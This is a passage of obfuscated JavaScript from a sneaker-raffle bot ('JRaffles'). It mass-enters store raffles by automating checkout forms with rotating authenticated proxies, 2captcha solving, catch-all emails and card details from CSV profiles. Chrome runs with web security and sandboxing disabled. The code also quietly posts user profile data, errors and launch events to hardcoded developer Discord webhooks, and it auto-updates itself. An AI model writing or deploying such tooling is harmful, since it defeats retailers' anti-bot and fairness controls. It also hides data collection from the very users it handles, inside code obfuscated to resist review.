            await _0x377189['waitForSelector']('#comp_address1'), await _0x377189['type']('#comp_address1', _0x5e42d1[_0x1267a8]['Address1'] + '\x20' + _0x5e42d1[_0x1267a8]['HouseNumber']), await _0x377189['waitForSelector']('#comp_address2'), await _0x377189['type']('#comp_address2', '' + _0x5e42d1[_0x1267a8]['Address2']), await _0x377189['waitForSelector']('#comp_address2'), await _0x377189['type']('#comp_address3', '' + _0x5e42d1[_0x1267a8]['City']), await _0x377189['waitForSelector']('#comp_postcode'), await _0x377189['type']('#comp_postcode', '' + _0x5e42d1[_0x1267a8]['Zip']), console['log'](_0x44cc98() + '\x20[' + _0x5207a1['name'] + ']\x20Task\x20' + (_0x1267a8 + 0x1) + '\x20:\x20Sending\x20Entry'), await _0x238216(0x4b0), await _0x377189['click']('label#emailhold'), await _0x238216(0x5dc), await _0x377189['click']('#preauth_tandc_email\x20>\x20label'), await _0x238216(0x5dc), await _0x377189['click']('#submit'), await _0x377189['waitForSelector']('#paymentWrap'), console['log'](_0x44cc98() + '\x20[' + _0x5207a1['name'] + ']\x20Task\x20' + (_0x1267a8 + 0x1) + '\x20:\x20' + _0xc5437b['blue']('Awaiting\x20Paypal\x20Payment')), _0xcf4285['on']('targetcreated', async _0x54b0fd => {
                if (_0x54b0fd['type']() === 'page') {
                    const _0x1a8695 = await _0x54b0fd['page']();
                    async function _0x349082() {
                        try {
                            await _0x377189['waitForSelector']('#error_message', { 'timeout': 0x493e0 }), _0x2a64fe = !![];
                            return;
                        } catch {
                        }
                    }
                    async function _0x3dd519() {
                        try {
                            await _0x377189['waitForSelector']('#successMessage', { 'timeout': 0x493e0 }), _0x35e0f2 = !![];
                            return;
                        } catch {
                        }
                    }
                    _0x3dd519(), _0x349082(), await _0x238216(0x493e0);
                }
            });
            async function _0x467fdc() {
                for (let _0x4a63cc = 0x0; _0x4a63cc < 0x12c; _0x4a63cc++) {
                    if (_0x35e0f2 == !![]) {
                        console['log'](_0xc5437b['green'](_0x44cc98() + '\x20[' + _0x5207a1['name'] + ']\x20Task\x20' + (_0x1267a8 + 0x1) + '\x20:\x20Raffle\x20Entered!'));
                        if (_0x5eb805['webhook'] != undefined && _0x5eb805['webhook'] != '')
                            try {
                                await _0x4f7227(_0x5eb805['webhook'], _0x423549['succesDEVMSG']);
                            } catch {
                            }
                        await _0x238216(0xc8), await _0x4f7227(_0x57a1da, _0x423549['succesDEVMSG']), await _0x238216(0xc8);
                        try {
                            await _0x4f7227(_0xfe9ed6, _0x423549['succesPUBMSG']);
                        } catch {
                        }
                        return;
                    } else {
                        if (_0x2a64fe)
                            throw new Error('Paypal\x20Error:\x20Target\x20closed');
                        else
                            await _0x238216(0x3e8);
                    }
                }
                throw new Error('Paypal\x20Error');
            }
            await _0x238216(0xbb8), await _0x377189['click']('.zoid-outlet'), await _0x238216(0x7d0), await _0x467fdc();
        } catch (_0x3692f1) {
            console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x5207a1['name'] + ']\x20Task\x20' + (_0x1267a8 + 0x1) + '\x20:\x20' + _0x3692f1)), _0x342b2a = '' + _0x3692f1;
            var _0x20ed75 = await _0x5e2a41(_0x5e42d1[_0x1267a8], _0x5207a1, 'dev', !![], _0x342b2a);
            _0x423549['errorDEV'] = { 'embeds': [_0x20ed75] }, _0x5eb805['webhook'] != undefined && _0x5eb805['webhook'] != '' && await _0x4f7227(_0x5eb805['webhook'], _0x423549['errorDEV']), await _0x4f7227(_0x11ec69, _0x423549['errorDEV']);
        } finally {
            _0xcf4285 && _0xcf4285['close'](), console['log']('Waiting\x20for\x20' + _0x5eb805['delay'] + '\x20ms'), await _0x238216(_0x5eb805['delay']);
        }
    }
}
async function _0x5c122(_0x4a7a7e, _0x1c22d1, _0x2305e4) {
    _0x15c804['use'](_0x21b95f()), _0x15c804['use'](_0x1fbb4f({
        'provider': {
            'id': '2captcha',
            'token': '' + _0x5eb805['captchaKey']
        },
        'visualFeedback': !![]
    }));
    for (var _0x41faa1 = 0x0; _0x41faa1 < _0x1c22d1['length']; _0x41faa1++) {
        _0x52fa74(_0x4a7a7e['name'] + '\x20Task\x20' + (_0x41faa1 + 0x1) + '\x20/\x20' + _0x1c22d1['length'] + '\x20||\x20File:\x20' + _0x23f754 + '\x20Proxies:\x20' + _0x47660c);
        var _0x4d41b9 = [{
            'type': 'rich',
            'title': 'Succesful\x20SevenStore\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x44a8dd
                },
                {
                    'name': 'Product',
                    'value': '' + _0x1c22d1[_0x41faa1]['Url']
                },
                {
                    'name': 'Size',
                    'value': '' + _0x1c22d1[_0x41faa1]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5eb805['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x5eb805['version']
                }
            ]
        }];
        const _0x5862a1 = { 'embeds': _0x4d41b9 };
        await _0x5c2071(_0x1c22d1, _0x41faa1);
        if (_0x1c22d1[_0x41faa1]['Email'] == '' || _0x1c22d1[_0x41faa1]['Password'] == '' || _0x1c22d1[_0x41faa1]['FirstName'] == '' || _0x1c22d1[_0x41faa1]['LastName'] == '') {
            console['log'](_0x44cc98() + '\x20[' + _0x4a7a7e['name'] + ']\x20Task\x20' + (_0x41faa1 + 0x1) + '\x20:\x20Invalid\x20CSV');
            continue;
        }
        (_0x1c22d1[_0x41faa1]['Password'] == '' || _0x1c22d1[_0x41faa1]['Password'] == undefined) && (_0x1c22d1[_0x41faa1]['Password'] = 'ErehsaWonRaj1!');
        if (_0x5eb805['useRandomProxy'] = ![])
            var _0x37b585 = _0x2305e4[_0x41faa1]['split'](':');
        else
            var _0xdd55a1 = Math['round'](Math['random']() * (_0x2305e4['length'] - 0x1)), _0x37b585 = _0x2305e4[_0xdd55a1]['split'](':');
        const _0x3ca63e = await _0x15c804['launch']({
            'headless': ![],
            'args': [
                '--proxy-server=' + _0x37b585[0x0] + ':' + _0x37b585[0x1],
                '--no-sandbox',
                '--incognito',
                '--disable-web-security',
                '--disable-features=IsolateOrigins',
                '\x20--disable-site-isolation-trials',
                '--disable-setuid-sandbox'
            ]
        });
        try {
            const _0x5e2eda = await _0x3ca63e['newPage']();
            await _0x5e2eda['authenticate']({
                'username': '' + _0x37b585[0x2],
                'password': '' + _0x37b585[0x3]
            }), console['log'](_0x44cc98() + '\x20[' + _0x4a7a7e['name'] + ']\x20Task\x20' + (_0x41faa1 + 0x1) + '\x20:\x20Getting\x20Session'), await _0x5e2eda['setRequestInterception'](!![]), _0x5e2eda['on']('request', _0x465335 => {
                _0x465335['resourceType']() === 'image' || _0x465335['resourceType']() === 'font' || _0x465335['resourceType']() === 'media' ? _0x465335['abort']() : _0x465335['continue']();
            }), await _0x5e2eda['setViewport']({
                'width': 0x500,
                'height': 0x2d0
            }), await _0x5e2eda['goto']('' + _0x1c22d1[_0x41faa1]['Url'], {
                'waitUntil': 'networkidle2',
                'timeout': 0x1d4c0
            }), await _0x5e2eda['waitForSelector']('#btnPdpAtb'), console['log'](_0x44cc98() + '\x20[' + _0x4a7a7e['name'] + ']\x20Task\x20' + (_0x41faa1 + 0x1) + '\x20:\x20Choosing\x20size\x20' + _0x1c22d1[_0x41faa1]['Size']);
            const _0x2e0af9 = await _0x5e2eda['$$eval']('div.pointer.pdpsizeoption.f-12.f-color3', _0x44d389 => {
                return _0x44d389['map'](_0x596b9c => _0x596b9c['innerText']);
            }), _0x2d85cd = await _0x5e2eda['$$']('div.pointer.pdpsizeoption.f-12.f-color3'), _0x57b4fd = ![];
            if (_0x1c22d1[_0x41faa1]['Size'] == 'RANDOM') {
                var _0x1d8b01 = Math['round'](Math['random']() * (_0x2d85cd['length'] - 0x1));
                await _0x2d85cd[_0x1d8b01]['click']();
            } else
                for (var _0x5863be = 0x0; _0x5863be < _0x2e0af9['length']; _0x5863be++) {
                    if (_0x2e0af9[_0x5863be] != _0x1c22d1[_0x41faa1]['Size'])
                        continue;
                    try {
                        await _0x2d85cd[_0x5863be]['click']();
                    } catch {
                        console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x4a7a7e['name'] + ']\x20Task\x20' + (_0x41faa1 + 0x1) + '\x20:\x20Size\x20Not\x20Found')), _0x57b4fd = !![];
                    }
                }
            if (_0x57b4fd)
                continue;
            await _0x238216(0x578), await _0x5e2eda['click']('#btnPdpAtb'), await _0x5e2eda['waitForSelector']('.fa.fa-check-circle.f-color8.f-30.valign-middle-important'), await _0x238216(0x3e8), console['log'](_0x44cc98() + '\x20[' + _0x4a7a7e['name'] + ']\x20Task\x20' + (_0x41faa1 + 0x1) + '\x20:\x20Getting\x20Checkout\x20Session'), await _0x5e2eda['goto']('https://www.sevenstore.com/login/?target=checkout'), await _0x5e2eda['waitForSelector']('#email'), await _0x5e2eda['type']('#email', _0x1c22d1[_0x41faa1]['Email']), await _0x238216(0x226), await _0x5e2eda['click']('#guest-submit'), await _0x238216(0x1b58), console['log'](_0x44cc98() + '\x20[' + _0x4a7a7e['name'] + ']\x20Task\x20' + (_0x41faa1 + 0x1) + '\x20:\x20Filling\x20Information'), await _0x5e2eda['waitForSelector']('#firstname'), await _0x5e2eda['type']('#firstname', _0x1c22d1[_0x41faa1]['FirstName'], 0x1f4), await _0x238216(0x190), await _0x5e2eda['waitForSelector']('#surname'), await _0x5e2eda['type']('#surname', _0x1c22d1[_0x41faa1]['LastName'], 0x1f4), await _0x238216(0x190), await _0x5e2eda['waitForSelector']('#mobile'), await _0x5e2eda['type']('#mobile', _0x1c22d1[_0x41faa1]['Phone'], 0x1f4), await _0x238216(0x190), await _0x5e2eda['click']('#enterManualDiv'), await _0x238216(0x5dc), await _0x5e2eda['waitForSelector']('#address1'), await _0x5e2eda['type']('#address1', _0x1c22d1[_0x41faa1]['Address1'] + '\x20' + _0x1c22d1[_0x41faa1]['HouseNumber'], 0x226), await _0x238216(0x384), await _0x5e2eda['waitForSelector']('#address2'), await _0x5e2eda['type']('#address2', '' + _0x1c22d1[_0x41faa1]['Address2'], 0x226), await _0x238216(0x320);
            const _0x3c13f9 = await _0x5e2eda['$$eval']('#countryselect_view3\x20>\x20option', _0x17023a => {
                return _0x17023a['map'](_0x4a67ea => _0x4a67ea['value']);
            });
            var _0x103702;
            for (var _0x267ae1 = 0x0; _0x267ae1 < _0x3c13f9['length']; _0x267ae1++) {
                if (_0x3c13f9[_0x267ae1]['startsWith']('' + _0x1c22d1[_0x41faa1]['Country'])) {
                    _0x103702 = _0x3c13f9[_0x267ae1];
                    break;
                }
                continue;
            }
            await _0x5e2eda['select']('#countryselect_view3', '' + _0x103702), await _0x5e2eda['waitForSelector']('#address4'), await _0x5e2eda['type']('#address4', '' + _0x1c22d1[_0x41faa1]['City'], 0x1f4), await _0x238216(0x384), await _0x5e2eda['waitForSelector']('#postcode'), await _0x5e2eda['type']('#postcode', '' + _0x1c22d1[_0x41faa1]['Zip'], 0x1f4), await _0x238216(0x4b0);
            const _0x4ad28e = await _0x5e2eda['url']();
            console['log'](_0x44cc98() + '\x20[' + _0x4a7a7e['name'] + ']\x20Task\x20' + (_0x41faa1 + 0x1) + '\x20:\x20Submitting\x20Entry');
            const _0x2cbb1c = _0x4ad28e['split']('?')[0x1], _0x12e8b3 = await _0x5e2eda['$']('#co_address_submit');
            await _0x12e8b3['evaluate'](_0x5d7def => _0x5d7def['click']()), await _0x238216(0x1388), await _0x5e2eda['goto']('https://www.sevenstore.com/checkout/pay/?' + _0x2cbb1c), console['log'](_0x44cc98() + '\x20[' + _0x4a7a7e['name'] + ']\x20Task\x20' + (_0x41faa1 + 0x1) + '\x20:\x20Getting\x20Payment\x20session'), await _0x5e2eda['waitForSelector']('#paymentbuttons'), await _0x238216(0x1388), await _0x5e2eda['click']('#paymentbuttons\x20>\x20div'), await _0x238216(0x1c2), await _0x5e2eda['waitForSelector']('#card-number'), await _0x5e2eda['waitForSelector']('#card-number\x20>\x20div\x20>\x20iframe');
            const _0x7866f3 = await _0x5e2eda['$']('#card-number\x20>\x20div\x20>\x20iframe'), _0x4ac749 = await _0x7866f3['contentFrame']();
            await _0x4ac749['waitForSelector']('.InputContainer'), await _0x4ac749['click']('.InputContainer\x20>\x20input'), await _0x238216(0x578), await _0x5e2eda['type']('#card-number', '' + _0x1c22d1[_0x41faa1]['CreditNumber']), await _0x238216(0xfa), await _0x5e2eda['type']('#card-expiry', '' + _0x1c22d1[_0x41faa1]['ExpiryDate']), await _0x238216(0xfa), await _0x5e2eda['type']('#card-cvc', '' + _0x1c22d1[_0x41faa1]['CVV']), await _0x238216(0x7d0), await _0x5e2eda['click']('#card-button'), console['log'](_0x44cc98() + '\x20[' + _0x4a7a7e['name'] + ']\x20Task\x20' + (_0x41faa1 + 0x1) + '\x20:\x20Awaiting\x203DS');
            try {
                await _0x5e2eda['waitForSelector']('.btn-auxilliary.btn-sub.fullwidth', { 'timeout': 0x493e0 }), console['log'](_0xc5437b['green'](_0x44cc98() + '\x20[' + _0x4a7a7e['name'] + ']\x20Task\x20' + (_0x41faa1 + 0x1) + '\x20:\x20Raffle\x20Entered!')), await _0x4f7227(_0x57a1da, _0x5862a1);
            } catch {
                console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x4a7a7e['name'] + ']\x20Task\x20' + (_0x41faa1 + 0x1) + '\x20:\x203DS\x20Failed')), _0x4d41b9[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x4d41b9[0x0]['description'] = '3DS\x20Failed', await _0x4f7227(_0x11ec69, _0x5862a1);
            }
        } catch (_0x20e628) {
            console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x4a7a7e['name'] + ']\x20Task\x20' + (_0x41faa1 + 0x1) + '\x20:\x20' + _0x20e628)), _0x4d41b9[0x0]['title'] = 'Failed\x20Seven\x20Entry', _0x4d41b9[0x0]['description'] = '' + _0x20e628, await _0x4f7227(_0x11ec69, _0x5862a1);
        } finally {
            _0x3ca63e && _0x3ca63e['close']();
            if (_0x41faa1 + 0x1 == _0x1c22d1['length']) {
                console['log'](_0xc5437b['green']('Finished\x20tasks,\x20returning\x20to\x20Main\x20Menu')), await _0x238216(0x7d0);
                break;
            }
            console['log']('Waiting\x20for\x20' + _0x5eb805['AfewDelay'] + '\x20ms'), await _0x238216(_0x5eb805['AfewDelay']);
        }
    }
}
async function _0x2de645(_0x4cba96, _0x1d6460, _0x12fdec, _0x4e5b33, _0xee4ba6) {
    var _0x3be691, _0x3dfffa = {}, _0x473a6e = [], _0x18ad20 = {}, _0x16f47b = [
        '40',
        '40,5',
        '41',
        '42',
        '42,5',
        '43',
        '44',
        '45',
        '45,5',
        '46',
        '47',
        '47,5',
        '48'
    ];
    !_0x4e5b33 && (_0x4e5b33 = {});
    if (_0x1d6460 != 'ver') {
        _0x52fa74(_0x12fdec['name'] + '\x20Task\x20' + (_0x4cba96 + 0x1) + '\x20/\x20' + _0x4e5b33['length'] + '\x20||\x20File:\x20' + _0x23f754 + '\x20Proxies:\x20' + _0x47660c), await _0x5c2071(_0x4e5b33, _0x4cba96), _0x473a6e = [{
            'type': 'rich',
            'title': 'Succesful\x20OQIUM\x20Entry',
            'description': '',
            'color': 0xc0d6d6,
            'fields': [
                {
                    'name': 'User',
                    'value': '' + _0x44a8dd
                },
                {
                    'name': 'Size',
                    'value': '' + _0x4e5b33[_0x4cba96]['Size']
                },
                {
                    'name': 'Delay',
                    'value': '' + _0x5eb805['delay']
                },
                {
                    'name': 'Version',
                    'value': '' + _0x3cb81f
                }
            ]
        }], _0x18ad20 = { 'embeds': _0x473a6e }, _0x3dfffa = _0x12fdec['data'];
        _0x1d6460 == 'exp' ? _0x3dfffa['data']['attributes']['email'] = '' + _0x4e5b33[_0x4cba96]['FirstName'] + _0x4e5b33[_0x4cba96]['LastName'] + _0x5eb805['catchall'] : _0x3dfffa['data']['attributes']['email'] = '' + _0x4e5b33[_0x4cba96]['Email'];
        if (_0x4e5b33[_0x4cba96]['Size'] == 'RANDOM') {
        }
        _0x3dfffa['data']['attributes']['properties']['$first_name'] = '' + _0x4e5b33[_0x4cba96]['FirstName'], _0x3dfffa['data']['attributes']['properties']['$last_name'] = '' + _0x4e5b33[_0x4cba96]['LastName'], _0x3dfffa['data']['attributes']['properties']['$address1'] = _0x4e5b33[_0x4cba96]['Address1'] + '\x20' + _0x4e5b33[_0x4cba96]['Address2'] + '\x20' + _0x4e5b33[_0x4cba96]['HouseNumber'], _0x3dfffa['data']['attributes']['properties']['$zip'] = '' + _0x4e5b33[_0x4cba96]['Zip'], _0x3dfffa['data']['attributes']['properties']['$city'] = '' + _0x4e5b33[_0x4cba96]['City'], _0x3dfffa['data']['attributes']['properties']['$country'] = '' + _0x4e5b33[_0x4cba96]['Country'], _0x3dfffa['data']['attributes']['properties']['Size'] = '' + _0x4e5b33[_0x4cba96]['Size'], _0x3dfffa['data']['attributes']['properties']['$phone_number'] = '' + _0x4e5b33[_0x4cba96]['Phone'], _0x3dfffa['data']['attributes']['properties']['Instagram\x20Account'] = '' + _0x4e5b33[_0x4cba96]['Follower'];
    }
    if (_0x5eb805['useRandomProxy'] = ![])
        var _0x45dfdd = _0xee4ba6[_0x4cba96]['split'](':');
    else
        var _0x19d2f3 = Math['round'](Math['random']() * (_0xee4ba6['length'] - 0x1)), _0x45dfdd = _0xee4ba6[_0x19d2f3]['split'](':');
    var _0x263d88 = {
        'jar': _0x3b1a30,
        'followAllRedirects': !![],
        'method': 'POST',
        'url': _0x12fdec['url'],
        'headers': _0x12fdec['headers'],
        'body': JSON['stringify'](_0x3dfffa),
        'proxy': 'http://' + _0x45dfdd[0x2] + ':' + _0x45dfdd[0x3] + '@' + _0x45dfdd[0x0] + ':' + _0x45dfdd[0x1]
    };
    return _0x1d6460 != 'ver' && (_0x263d88['url'] = _0x12fdec['url'], _0x263d88['headers'] = _0x12fdec['headers']), _0x1d6460 == 'ver' && (_0x263d88['method'] = 'GET'), new Promise(function (_0x211acc, _0xe4aca0) {
        callback = async (_0x316bfc, _0x9631a4, _0x53a05d) => {
            if (!_0x316bfc && _0x9631a4['statusCode'] == 0xca || !_0x316bfc && _0x9631a4['statusCode'] == 0xc8) {
                if (_0x1d6460 != 'ver') {
                    var _0x567fd5 = await _0x5e2a41(_0x4e5b33[_0x4cba96], _0x12fdec, 'dev', ![]), _0x50ac48 = await _0x5e2a41(_0x4e5b33[_0x4cba96], _0x12fdec, 'pub', ![]);
                    const _0x470aa8 = {
                        'succesDEVMSG': { 'embeds': [_0x567fd5] },
                        'succesPUBMSG': { 'embeds': [_0x50ac48] }
                    };
                    if (_0x5eb805['webhook'] != undefined && _0x5eb805['webhook'] != '')
                        try {
                            await _0x4f7227(_0x5eb805['webhook'], _0x470aa8['succesDEVMSG']);
                        } catch {
                        }
                    await _0x238216(0xc8), await _0x4f7227(_0x57a1da, _0x470aa8['succesDEVMSG']), await _0x238216(0xc8);
                    try {
                        await _0x4f7227(_0xfe9ed6, _0x470aa8['succesPUBMSG']);
                    } catch {
                    }
                }
                _0x211acc(console['log'](_0xc5437b['green'](_0x44cc98() + '\x20[' + _0x12fdec['name'] + ']\x20Task\x20' + (_0x4cba96 + 0x1) + ':\x20Raffle\x20Entered!')));
            } else {
                if (_0x1d6460 != 'ver') {
                    var _0x5eda21 = '' + _0x316bfc, _0x1571ad = await _0x5e2a41(_0x4e5b33[_0x4cba96], _0x12fdec, 'dev', !![], _0x5eda21), _0x5d84a7 = {};
                    _0x5d84a7['errorDEV'] = { 'embeds': [_0x1571ad] }, _0x5eb805['webhook'] != undefined && _0x5eb805['webhook'] != '' && await _0x4f7227(_0x5eb805['webhook'], _0x5d84a7['errorDEV']), await _0x4f7227(_0x11ec69, _0x5d84a7['errorDEV']);
                }
                _0xe4aca0(console['log'](_0x44cc98() + '\x20[' + _0x12fdec['name'] + ']\x20Task\x20' + (_0x4cba96 + 0x1) + ':\x20' + _0x316bfc));
            }
        };
        try {
            _0x1d6460 != 'ver' && console['log'](_0x44cc98() + '\x20[' + _0x12fdec['name'] + ']\x20Task\x20' + (_0x4cba96 + 0x1) + ':\x20Sending\x20Entry\x20for\x20' + _0x3dfffa['data']['attributes']['email']), _0x128d00(_0x263d88, callback);
        } catch (_0x535e08) {
            console['log'](_0x44cc98() + '\x20Task\x20' + (_0x4cba96 + 0x1) + ':\x20' + _0x535e08);
        }
    });
}
;
async function _0x5cc269() {
    await _0x44089a(), console['clear']();
    if (_0x3cb81f != 'devkey') {
        let _0x2065c8 = await _0x8da982['autoUpdate']();
        if (_0x2065c8 === 'yes')
            return _0x517d02('node\x20JRaffles.js');
        console['clear']();
    }
    if (_0xc565dd == '') {
        console['log']('No\x20key\x20found\x20in\x20settings.json');
        return await _0x238216(0x2710);
        ;
    }
    await _0x32cd54(_0xc565dd);
    if (_0x1749ce === ![])
        return console['log']('Closing\x20Browser'), await _0x238216(0xbb8);
    else
        try {
            var _0x52bdc9 = [{
                'type': 'rich',
                'title': 'User\x20Opened\x20JRaffles',
                'description': '',
                'color': 0xc0d6d6,
                'fields': [
                    {
                        'name': 'User',
                        'value': '' + _0x44a8dd
                    },
                    {
                        'name': 'Version',
                        'value': '' + _0x3cb81f
                    }
                ]
            }];
            const _0x4a7a20 = { 'embeds': _0x52bdc9 };
            await _0x4f7227(_0x310ae4, _0x4a7a20);
            async function _0x5816ec() {
                _0x52fa74('JRaffles\x20' + _0x3cb81f), console['clear'](), console['log']('Welcome\x20to\x20' + _0xc5437b['cyan']('JRaffles();') + '\x20' + _0x3cb81f), console['log']('Choose\x20a\x20Module\x20to\x20run..\x0a');
                for (var _0x30f464 = 0x0; _0x30f464 < _0x1159f2['length']; _0x30f464++) {
                    if (_0x1159f2[_0x30f464]['name'] === 'Reload\x20Settings' || _0x1159f2[_0x30f464]['name'] === 'Change\x20Settings')
                        continue;
                    else
                        console['log']('\x20(' + _0x30f464 + ')\x20[' + _0x1159f2[_0x30f464]['name'] + ']');
                }
                ;
                console['log']('\x0a\x20-----------------------------------------------------\x20\x0a'), console['log']('\x20(' + (_0x1159f2['length'] - 0x2) + ')\x20Change\x20Settings'), console['log']('\x20(' + (_0x1159f2['length'] - 0x1) + ')\x20Reload\x20Settings'), console['log'](''), taskModule = await _0x18328e();
                if (taskModule > _0x1159f2['length'] - 0x1 || isNaN(taskModule) == !![])
                    return console['log']('Invalid\x20selection'), await _0x238216(0x3e8), _0x5816ec();
                if (_0x1159f2[taskModule]['name'] == 'AFEW\x20Store') {
                    taskFunction = await _0x5535ca(_0x1159f2[taskModule]['modules']);
                    var _0x3c06a7 = _0x1159f2[taskModule]['modules'][taskFunction];
                    console['clear']();
                    var _0x5dd6af = await _0x36faf5(), _0x4ee4e3 = await _0x245127();
                    if (_0x4ee4e3[0x0]['Url'] == '' || _0x4ee4e3[0x0]['Url'] == undefined) {
                        await _0x327cf6(_0x5dd6af);
                        var _0x422fa4 = await _0x3274e4();
                        return await afewFunction('' + _0x2b00a6[_0x422fa4], 'nor', _0x3c06a7, _0x4ee4e3, _0x5dd6af), _0x5816ec();
                    }
                    return await afewFunction(_0x4ee4e3[0x0]['Url'], 'nor', _0x3c06a7, _0x4ee4e3, _0x5dd6af), _0x5816ec();
                } else {
                    if (_0x1159f2[taskModule]['name'] == 'MAHA\x20Amsterdam') {
                        taskFunction = await _0x5535ca(_0x1159f2[taskModule]['modules']);
                        var _0x3c06a7 = _0x1159f2[taskModule]['modules'][taskFunction];
                        if (taskFunction == 0x0) {
                            var _0x5dd6af = await _0x36faf5(), _0x424496 = await _0x245127();
                            console['log']('Starting\x20' + _0x424496['length'] + '\x20MAHA\x20Tasks');
                            for (var _0xcdb47a = 0x0; _0xcdb47a < _0x424496['length']; _0xcdb47a++) {
                                console['log'](_0x44cc98() + '\x20[' + _0x3c06a7['name'] + ']\x20Task\x20' + (_0xcdb47a + 0x1) + ':\x20Getting\x20Session'), await _0xfaf94e(_0xcdb47a, 'nor', _0x3c06a7, _0x424496, _0x5dd6af), console['log'](_0x44cc98() + '\x20[' + _0x3c06a7['name'] + ']\x20Sleeping\x20for\x20' + _0x5eb805['MahaDelay'] + '\x20ms'), await _0x238216(_0x5eb805['MahaDelay']);
                            }
                            ;
                            return _0x5816ec();
                        } else {
                            if (taskFunction == 0x1) {
                                var _0x5dd6af = await _0x36faf5();
                                console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), linksRaw = await _0x37eabd(), links = linksRaw['split'](';'), console['log'](links['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                for (var _0xcdb47a = 0x0; _0xcdb47a < links['length']; _0xcdb47a++) {
                                    _0x3c06a7['url'] = links[_0xcdb47a], console['log'](_0x44cc98() + '\x20[' + _0x3c06a7['name'] + ']\x20Task\x20' + (_0xcdb47a + 0x1) + ':\x20Getting\x20Session'), await _0xfaf94e(_0xcdb47a, 'ver', _0x3c06a7, _0x424496, _0x5dd6af), console['log'](_0x44cc98() + '\x20[' + _0x3c06a7['name'] + ']\x20Sleeping\x20for\x20' + _0x5eb805['verificationDelay'] + '\x20ms'), await _0x238216(_0x5eb805['verificationDelay']);
                                }
                                ;
                                return _0x5816ec();
                            }
                        }
                    } else {
                        if (_0x1159f2[taskModule]['name'] == 'FOOTSHOP') {
                            taskFunction = await _0x5535ca(_0x1159f2[taskModule]['modules']);
                            var _0x3c06a7 = _0x1159f2[taskModule]['modules'][taskFunction], _0x5dd6af = await _0x36faf5(), _0x186ef0 = await _0x245127();
                            return await _0x147b6d(_0x186ef0, _0x5dd6af, _0x3c06a7), await _0x238216(0x1388), _0x5816ec();
                        } else {
                            if (_0x1159f2[taskModule]['name'] == 'OQIUM\x20Store') {
                                taskFunction = await _0x5535ca(_0x1159f2[taskModule]['modules']);
                                var _0x3c06a7 = _0x1159f2[taskModule]['modules'][taskFunction];
                                console['clear']();
                                if (taskFunction == 0x0) {
                                    var _0x5dd6af = await _0x36faf5(), _0x2a6a59 = await _0x245127();
                                    console['log']('Starting\x20' + _0xc5437b['yellow']('OQIUM') + '\x20Tasks');
                                    for (var _0xcdb47a = 0x0; _0xcdb47a < _0x2a6a59['length']; _0xcdb47a++) {
                                        console['log'](_0x44cc98() + '\x20[' + _0x3c06a7['name'] + ']\x20Task\x20' + (_0xcdb47a + 0x1) + ':\x20Getting\x20Session');
                                        try {
                                            await _0x2de645(_0xcdb47a, 'nor', _0x3c06a7, _0x2a6a59, _0x5dd6af);
                                        } catch (_0x355897) {
                                            console['log'](_0xc5437b['red'](_0x44cc98() + '\x20[' + _0x3c06a7['name'] + ']\x20Task\x20' + (_0xcdb47a + 0x1) + ':\x20Task\x20failed\x20' + _0x355897));
                                        }
                                        console['log'](_0x44cc98() + '\x20[' + _0x3c06a7['name'] + ']\x20Sleeping\x20for\x20' + _0x5eb805['delay'] + '\x20ms'), await _0x238216(_0x5eb805['delay']);
                                    }
                                    return _0x5816ec();
                                } else {
                                    if (taskFunction == 0x1) {
                                        var _0x5dd6af = await _0x36faf5();
                                        console['log']('Use\x20the\x20JRaffles\x20Chrome\x20Extension\x20to\x20copy\x20your\x20links\x20here..'), linksRaw = await _0x37eabd(), links = linksRaw['split'](';'), console['log'](links['length'] + '\x20links\x20found!'), console['log']('Starting\x20verification..');
                                        for (var _0xcdb47a = 0x0; _0xcdb47a < links['length']; _0xcdb47a++) {
                                            try {
                                                _0x3c06a7['url'] = links[_0xcdb47a], console['log'](_0x44cc98() + '\x20[' + _0x1159f2[taskModule]['name'] + ']\x20Task\x20' + (_0xcdb47a + 0x1) + ':\x20Getting\x20Session'), await _0x2de645(_0xcdb47a, 'ver', _0x3c06a7, null, _0x5dd6af), console['log'](_0x44cc98() + '\x20[' + _0x1159f2[taskModule]['name'] + ']\x20Sleeping\x20for\x20' + _0x5eb805['verificationDelay'] + '\x20ms'), await _0x238216(_0x5eb805['verificationDelay']);
                                            } catch (_0x4ae606) {
                                                console['log'](_0x4ae606), await _0x238216(0x1388);
                                            }
                                            ;
                                        }
                                        ;
                                        return _0x5816ec();
                                    }
                                }
                                ;
                            } else {
                                if (_0x1159f2[taskModule]['name'] == 'BOUNCEWEAR') {
                                    taskFunction = await _0x5535ca(_0x1159f2[taskModule]['modules']);
                                    var _0x3c06a7 = _0x1159f2[taskModule]['modules'][taskFunction];
                                    console['clear']();
                                    if (taskFunction == 0x0)
                                        await _0x4a89bf('https://bouncewear.com/nl/account/register', _0x3c06a7);
                                    else {
                                        if (taskFunction == 0x1) {
                                        }
                                    }
                                    ;
                                } else {
                                    if (_0x1159f2[taskModule]['name'] == 'PATTA') {
                                        taskFunction = await _0x5535ca(_0x1159f2[taskModule]['modules']);
                                        var _0x3c06a7 = _0x1159f2[taskModule]['modules'][taskFunction];
                                        console['clear']();
                                        if (taskFunction == 0x0) {
                                            var _0x5dd6af = await _0x36faf5(), _0x5e2d2f = await _0x245127();
                                            return await _0x3d7f35('https://patta.nl/account/register', _0x3c06a7, _0x5e2d2f, _0x5dd6af), _0x5816ec();
                                        } else {
                                            if (taskFunction == 0x1) {
                                                var _0x5dd6af = await _0x36faf5(), _0x5e2d2f = await _0x245127();
                                                return await _0x395fc0('', _0x3c06a7, _0x5e2d2f, _0x5dd6af), _0x5816ec();
                                            }
                                        }
                                        ;
                                    } else {
                                        if (_0x1159f2[taskModule]['name'] == 'SLAMJAM')
                                            return console['log']('inalid\x20selection'), _0x5816ec();
                                        else {
                                            if (_0x1159f2[taskModule]['name'] == 'KICKZ') {
                                                taskFunction = await _0x5535ca(_0x1159f2[taskModule]['modules']);
                                                var _0x3c06a7 = _0x1159f2[taskModule]['modules'][taskFunction];
                                                console['clear']();
                                                if (taskFunction == 0x0) {
